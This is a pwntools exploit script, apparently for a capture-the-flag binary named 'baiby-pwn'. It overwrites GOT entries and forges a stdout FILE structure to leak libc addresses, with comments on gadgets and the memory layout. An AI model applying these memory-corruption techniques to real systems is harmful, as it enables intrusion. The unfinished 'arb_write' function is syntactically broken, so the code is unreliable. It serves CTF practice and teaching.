#!/usr/bin/env python3

from pwn import *
import struct

e = ELF("./baiby-pwn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e

# context.terminal =  ['tmux', 'new-window', '-n', 'GDB']
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "splitw", "-h"]


# context.log_level = "debug"
DOCKER_PORT		= 5000
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """

"""

if args.GDB:
    r = process(e.path, stderr=subprocess.STDOUT)
    gdb.attach(r, gdbscript=GDB_SCRIPT)
elif args.LOCAL:
	# redirect stderr->stdout so the exit-flush leak (fd2) lands on the tube
	r = process(["sh", "-c", f"exec {e.path} 2>&1"])
elif args.DOCKER:
    # run container with sudo docker run --rm --privileged -p 5000:5000 pwnchall
	r = remote("localhost", DOCKER_PORT)
else:
	r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

def pack(v):
	s = "%d" % v
	assert len(s) <= 7
	return s.encode() + b"\n" * (7 - len(s))

def option_1(addr, v): # menu: array[index] = value
    idx = (addr - e.sym.arr) // 8
    sn(pack(1) + pack(idx) + pack(v))
    return

def option_2():
    sn(pack(2))
    return


""" 
from pwndbg:

Section .plt.sec 0x401080 - 0x4010d0:
0x401080: __stack_chk_fail@plt
0x401090: setbuf@plt
0x4010a0: memset@plt
0x4010b0: read@plt
0x4010c0: atol@plt
"""

"""
gadgets:

call_read:
➜  baiby-pwn objdump -d ./baiby-pwn_patched | grep "call.*4010b0"                            
  4011ea:	e8 c1 fe ff ff       	call   4010b0 <read@plt>
➜  baiby-pwn objdump -d ./baiby-pwn_patched | grep -b5 "call.*4010b0"

# ...
7056-  4011e2:	48 89 c6             	mov    %rax,%rsi
7105-  4011e5:	bf 00 00 00 00       	mov    $0x0,%edi
7154:  4011ea:	e8 c1 fe ff ff       	call   4010b0 <read@plt>
# ...

load_stdout:
objdump -d ./baiby-pwn_patched | grep -b5 "call.*401090"

# load stdin
7811-  401216:	48 89 e5             	mov    %rsp,%rbp
7860-  401219:	48 83 ec 10          	sub    $0x10,%rsp
7910-  40121d:	48 8b 05 2c 2e 00 00 	mov    0x2e2c(%rip),%rax        # 404050 <stdin@GLIBC_2.2.5>
8003-  401224:	be 00 00 00 00       	mov    $0x0,%esi
8052-  401229:	48 89 c7             	mov    %rax,%rdi 
8101:  40122c:	e8 5f fe ff ff       	call   401090 <setbuf@plt>

# load stdout
8160-  401231:	48 8b 05 08 2e 00 00 	mov    0x2e08(%rip),%rax        # 404040 <stdout@GLIBC_2.2.5>
8254-  401238:	be 00 00 00 00       	mov    $0x0,%esi
8303-  40123d:	48 89 c7             	mov    %rax,%rdi
8352:  401240:	e8 4b fe ff ff       	call   401090 <setbuf@plt>

# load stderr  
8411-  401245:	48 8b 05 14 2e 00 00 	mov    0x2e14(%rip),%rax        # 404060 <stderr@GLIBC_2.2.5>
8505-  40124c:	be 00 00 00 00       	mov    $0x0,%esi
8554-  401251:	48 89 c7             	mov    %rax,%rdi
8603:  401254:	e8 37 fe ff ff       	call   401090 <setbuf@plt>
"""

call_read = 0x4011e2 # mov rsi, rax; mov edi, 0; call read@plt
load_stdout = 0x401231 # mov rax, [stdout]; mov esi, 0; mov rdi, rax; rdi = &_IO_2_1_stdout_; call setbuf@plt
load_stdin = 0x401216

stdout_ptr = 0x404040
stdin_ptr = stdout_ptr + 0x10 
sterr_ptr = stdin_ptr + 0x10


"""
idea: make stdout think its buffer output is in the got -> when libc empties its buffers it prints the got addresses -> libc leak 

setbuf = changes a stream's buffer:
    - setbuf(stdout, null) -> stdout is in unbuffered mode
    - setbuf(stdout, ptr) -> uses ptr as the buffer instead of the default one

internally it does setbuf(stdout, 0) -> _IO_setbuf -> _IO_file_setbuf -> _IO_default_setbuf -> _IO_SYNC -> _IO_do_flush -> _IO_OVERFLOW / _IO_do_write

_IO_SYNC empties the old buffer before changing it. to empty it , checks _IO_write_base and _IO_write_ptr from the stdout file structure :) so if i corrupt them i can print whatever i want

how to leak:
- overwrite (in the got) memset with a gadget to load stdout, and setbuf with a gadget to call read
- choose option 2 which becomes read from stdout (input request)
- send the fake file structure which will be written into stdout 
- set setbuf to its original value on the got

now:
option_2 -> got.memset -> gadget to load stdout -> setbuf(stdout, NULL) -> setbuf empties setbuf buffer -> prints data from the got
"""


def leak():
    # overwrite the got.stack_check_fail function to main + 72 -> return of the main loop so the program won't crash if the canary is fucked up
    option_1(e.got.__stack_chk_fail, e.sym.main+72)

    option_1(e.got.memset, load_stdout) # memset -> loads stdout , calls setbuf
    option_1(e.got.setbuf, call_read) # setbuf -> read(0, rax, rdx)

    option_2() # expects input 

    """ 
    got: 
    GOT protection: Partial RELRO | Found 5 GOT entries passing the filter
    [0x404000] __stack_chk_fail@GLIBC_2.4 -> 0x401030 ◂— endbr64
    [0x404008] setbuf@GLIBC_2.2.5 -> 0x7ffff7c9ed90 (setbuf) ◂— endbr64
    [0x404010] memset@GLIBC_2.2.5 -> 0x401050 ◂— endbr64
    [0x404018] read@GLIBC_2.2.5 -> 0x7ffff7d3e970 (read) ◂— endbr64
    [0x404020] atol@GLIBC_2.2.5 -> 0x401070 ◂— endbr64
    
    after the got there are stdout, stderr and stdin, we need to leak also those addresses (i could have just done libc base + offset but nevermind):
    x/100x 0x404000
    0x404000 <__stack_chk_fail@got.plt>:	0x00401030	0x00000000	0xf7c9ed90	0x00007fff
    0x404010 <memset@got.plt>:	0x00401050	0x00000000	0xf7d3e970	0x00007fff
    0x404020 <atol@got.plt>:	0x00401070	0x00000000	0x00000000	0x00000000
    0x404030:	0x00000000	0x00000000	0x00000000	0x00000000
    0x404040 <stdout@GLIBC_2.2.5>:	0xf7e51580	0x00007fff	0x00000000	0x00000000
    0x404050 <stdin@GLIBC_2.2.5>:	0xf7e508e0	0x00007fff	0x00000000	0x00000000
    0x404060 <stderr@GLIBC_2.2.5>:	0xf7e514a0	0x00007fff	0x00000000	0x00000000
    0x404070:	0x00000000	0x00000000	0x00000000	0x00000000

    """
    fs = FileStructure()
    fs.flags = 0xFBAD1800
    fs._IO_write_base = 0x404000
    fs._IO_write_ptr = 0x404068
    fs._IO_write_end = 0x404068
    payload = bytes(fs)[:0x68]
    sn(payload) 

    # i have the leak!!

    # restore got.setbuf to its normal value
    option_1(e.got.setbuf, e.plt.setbuf)
    # option_2() 
    leaked = r.recvn(0x68, timeout=8)

    atol = u64(leaked[0x20:0x28])
    aleak('atol', atol)
    libc.addr = atol - 0x46680
    aleak('libc', libc.addr)
    
    stdout = u64(leaked[0x40:0x48])
    stderr = u64(leaked[0x60:0x68])

    return

# TODO: arb write
arb_write(addr, data):
    for off in range(0, len(data), 0x40):




def main():

    leak()
    r.interactive()


if __name__ == "__main__":
	main()


""" 
no pie, partial relro, nx, canary, ibt and shstk enabled, can't do execve because of landlock in launcher

option 1:
arr[index] = value writes 8 bytes at arr + index * 8
arr @ 0x404080

option 2: 
calls memset from the got. 

checksec:
partial relro -> .got.plt is writable, can't be non-writable because of linker's lazy binding = fuctions are resolved at the first call, with full relro they are resolved at the program start and then the got is made read only
-> i can overwrite got entries

"""
